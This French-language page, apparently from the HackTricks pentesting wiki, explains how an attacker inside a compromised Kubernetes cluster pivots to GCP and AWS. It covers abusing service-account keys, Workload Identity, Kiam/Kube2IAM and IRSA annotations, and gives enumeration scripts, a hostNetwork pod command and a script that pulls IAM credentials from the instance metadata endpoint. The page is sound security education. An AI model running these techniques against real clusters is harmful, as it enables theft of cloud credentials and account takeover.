# Kubernetes Pivoting vers les Clouds

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## GCP

Si vous ex√©cutez un cluster k8s √† l'int√©rieur de GCP, vous voudrez probablement qu'une application s'ex√©cutant √† l'int√©rieur du cluster ait un certain acc√®s √† GCP. Il existe 2 fa√ßons courantes de le faire :

### Monter les cl√©s GCP-SA en tant que secret

Une fa√ßon courante de donner **acc√®s √† une application Kubernetes √† GCP** est de :

* Cr√©er un compte de service GCP
* Lui attribuer les autorisations souhait√©es
* T√©l√©charger une cl√© JSON du compte de service cr√©√©
* Le monter en tant que secret √† l'int√©rieur du pod
* D√©finir la variable d'environnement GOOGLE\_APPLICATION\_CREDENTIALS pointant vers le chemin o√π se trouve le fichier JSON.

{% hint style="warning" %}
Par cons√©quent, en tant qu'**attaquant**, si vous compromettez un conteneur √† l'int√©rieur d'un pod, vous devriez v√©rifier cette **variable d'environnement** et les **fichiers JSON** contenant les informations d'identification GCP.
{% endhint %}

### Relier le JSON GSA au secret KSA

Une fa√ßon de donner acc√®s √† un GSA √† un cluster GKE consiste √† les lier de la mani√®re suivante :

* Cr√©ez un compte de service Kubernetes dans le m√™me espace de noms que votre cluster GKE en utilisant la commande suivante :
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* Cr√©ez un Secret Kubernetes qui contient les informations d'identification du compte de service GCP auquel vous souhaitez accorder l'acc√®s au cluster GKE. Vous pouvez le faire en utilisant l'outil en ligne de commande `gcloud`, comme le montre l'exemple suivant :
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* Liez le Secret Kubernetes au compte de service Kubernetes en utilisant la commande suivante :
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
Dans la **deuxi√®me √©tape**, les **informations d'identification du GSA ont √©t√© d√©finies comme secret du KSA**. Ensuite, si vous pouvez **lire ce secret** depuis **l'int√©rieur** du cluster **GKE**, vous pouvez **escalader vers ce compte de service GCP**.
{% endhint %}

### Identit√© de charge de travail GKE

Avec l'identit√© de charge de travail, nous pouvons configurer un[ compte de service Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) pour agir en tant que[ compte de service Google](https://cloud.google.com/iam/docs/understanding-service-accounts). Les pods s'ex√©cutant avec le compte de service Kubernetes s'authentifieront automatiquement en tant que compte de service Google lorsqu'ils acc√©deront aux API Google Cloud.

La **premi√®re s√©rie d'√©tapes** pour activer ce comportement consiste √† **activer l'identit√© de charge de travail dans GCP** ([**√©tapes**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) et √† cr√©er le compte de service GCP que vous souhaitez que k8s impersonne.

* **Activer l'identit√© de charge de travail** sur un nouveau cluster

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
* **Cr√©er/Mettre √† jour un nouveau pool de n≈ìuds** (Les clusters Autopilot n'ont pas besoin de cela)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* Cr√©ez le **compte de service GCP √† usurper** depuis K8s avec les autorisations GCP :

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **Connectez-vous** au **cluster** et **cr√©ez** le **compte de service** √† utiliser

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **Lier le GSA avec le KSA**

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* Ex√©cutez un **pod** avec le **KSA** et v√©rifiez l'**acc√®s** √† **GSA** :
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
V√©rifiez la commande suivante pour vous authentifier si n√©cessaire :

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
En tant qu'attaquant √† l'int√©rieur de K8s, vous devriez **rechercher des SAs** avec l'**annotation `iam.gke.io/gcp-service-account`** car cela indique que le SA peut acc√©der √† quelque chose dans GCP. Une autre option serait d'essayer d'exploiter chaque KSA dans le cluster et de v√©rifier s'il a acc√®s.\
Depuis GCP, il est toujours int√©ressant d'√©num√©rer les liens et de savoir **quel acc√®s vous donnez aux SAs √† l'int√©rieur de Kubernetes**.
{% endhint %}

Voici un script pour **parcourir facilement toutes les d√©finitions des pods** √† la recherche de cette **annotation** :
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (IAM role for Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Une fa√ßon (obsol√®te) de donner des r√¥les IAM aux Pods est d'utiliser un serveur [**Kiam**](https://github.com/uswitch/kiam) ou [**Kube2IAM**](https://github.com/jtblin/kube2iam). Fondamentalement, vous devrez ex√©cuter un **daemonset** dans votre cluster avec un **type de r√¥le IAM privil√©gi√©**. Ce daemonset sera celui qui donnera acc√®s aux r√¥les IAM aux pods qui en ont besoin.

Tout d'abord, vous devez configurer **quels r√¥les peuvent √™tre accessibles √† l'int√©rieur de l'espace de noms**, et vous le faites avec une annotation √† l'int√©rieur de l'objet de l'espace de noms:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

Une fois que l'espace de noms est configur√© avec les r√¥les IAM que les Pods peuvent avoir, vous pouvez **indiquer le r√¥le souhait√© sur chaque d√©finition de pod avec quelque chose comme**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
En tant qu'attaquant, si vous **trouvez ces annotations** dans les pods ou les espaces de noms ou si un serveur kiam/kube2iam est en cours d'ex√©cution (probablement dans kube-system), vous pouvez **usurper chaque r**√¥le d√©j√† **utilis√© par les pods** et plus encore (si vous avez acc√®s au compte AWS, √©num√©rez les r√¥les).
{% endhint %}

#### Cr√©er un Pod avec un r√¥le IAM

{% hint style="info" %}
Le r√¥le IAM √† indiquer doit √™tre dans le m√™me compte AWS que le r√¥le kiam/kube2iam et ce r√¥le doit pouvoir y acc√©der.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### R√¥le IAM pour les comptes de service K8s via OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Ceci est la **m√©thode recommand√©e par AWS**.

1. Tout d'abord, vous devez [cr√©er un fournisseur OIDC pour le cluster](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Ensuite, vous cr√©ez un r√¥le IAM avec les autorisations requises par le compte de service (SA).
3. Cr√©ez une [relation de confiance entre le r√¥le IAM et le compte de service](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) en utilisant le nom du compte de service (ou les espaces de noms donnant acc√®s au r√¥le √† tous les comptes de service du namespace). _La relation de confiance v√©rifiera principalement le nom du fournisseur OIDC, le nom du namespace et le nom du compte de service_.
4. Enfin, **cr√©ez un compte de service avec une annotation indiquant l'ARN du r√¥le**, et les pods s'ex√©cutant avec ce compte de service auront **acc√®s au jeton du r√¥le**. Le **jeton** est **√©crit** dans un fichier dont le chemin est sp√©cifi√© dans **`AWS_WEB_IDENTITY_TOKEN_FILE`** (par d√©faut : `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
Pour **obtenir aws en utilisant le jeton** de `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`, ex√©cutez :

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
En tant qu'attaquant, si vous pouvez √©num√©rer un cluster K8s, v√©rifiez les **comptes de service avec cette annotation** pour **escalader vers AWS**. Pour ce faire, **ex√©cutez/cr√©ez** simplement un **pod** en utilisant l'un des **comptes de service privil√©gi√©s IAM** et volez le jeton.

De plus, si vous √™tes √† l'int√©rieur d'un pod, v√©rifiez les variables d'environnement telles que **AWS\_ROLE\_ARN** et **AWS\_WEB\_IDENTITY\_TOKEN**.
{% endhint %}

{% hint style="danger" %}
Parfois, la **politique de confiance d'un r√¥le** peut √™tre **mal configur√©e** et au lieu de donner l'acc√®s AssumeRole au compte de service attendu, elle le donne √† **tous les comptes de service**. Par cons√©quent, si vous √™tes capable d'√©crire une annotation sur un compte de service contr√¥l√©, vous pouvez acc√©der au r√¥le.

Consultez la **page suivante pour plus d'informations**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### Trouver des pods et des comptes de service avec des r√¥les IAM dans le cluster

Voici un script pour **it√©rer facilement sur tous les pods et les d√©finitions de comptes de service** √† la recherche de cette **annotation** :
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### R√¥le IAM du n≈ìud

La section pr√©c√©dente traitait de la fa√ßon de voler les r√¥les IAM avec les pods, mais notez qu'un **n≈ìud du** cluster K8s va √™tre une **instance √† l'int√©rieur du cloud**. Cela signifie que le n≈ìud a tr√®s probablement un **nouveau r√¥le IAM que vous pouvez voler** (_notez que g√©n√©ralement tous les n≈ìuds d'un cluster K8s auront le m√™me r√¥le IAM, il peut donc ne pas √™tre utile de v√©rifier chaque n≈ìud_).

Cependant, il est important de noter qu'il y a une exigence importante pour acc√©der au point de terminaison des m√©tadonn√©es √† partir du n≈ìud, vous devez √™tre dans le n≈ìud (session ssh ?) ou au moins avoir le m√™me r√©seau :
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### Voler le jeton de r√¥le IAM

Pr√©c√©demment, nous avons discut√© de la fa√ßon de **joindre des r√¥les IAM aux Pods** ou m√™me de **s'√©chapper vers le Node pour voler le r√¥le IAM** auquel l'instance est attach√©e.

Vous pouvez utiliser le script suivant pour **voler** les nouvelles **informations d'identification du r√¥le IAM** sur lesquelles vous avez travaill√© dur :
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## R√©f√©rences

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
